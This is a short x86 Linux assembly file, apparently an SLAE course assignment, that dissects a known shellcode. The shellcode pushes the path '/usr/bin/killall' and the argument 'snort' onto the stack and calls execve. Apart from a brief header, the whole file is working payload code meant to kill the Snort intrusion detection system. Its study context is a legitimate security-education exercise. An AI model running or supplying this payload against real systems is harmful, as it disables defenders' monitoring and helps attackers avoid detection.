# Dissection - killall snort, original version
# Paw Petersen, SLAE-656
# https://www.pawpetersen.dk/slae-assignment-6b-polymorphic-shellcode-killall-snort-linux-x86/

global _start
section .text
_start:
  xor    eax,eax
  push   eax
  push   0x74             ; t
  push   0x726f6e73       ; rons
  mov    esi,esp
  push   eax
  push   0x6c6c616c       ; llal
  push   0x6c696b2f       ; lik/
  push   0x6e69622f       ; nib/
  push   0x7273752f       ; rsu/
  mov    ebx,esp
  push   eax
  push   esi
  push   ebx
  mov    ecx,esp
  xor    edx,edx
  mov    al,0xb
  int    0x80
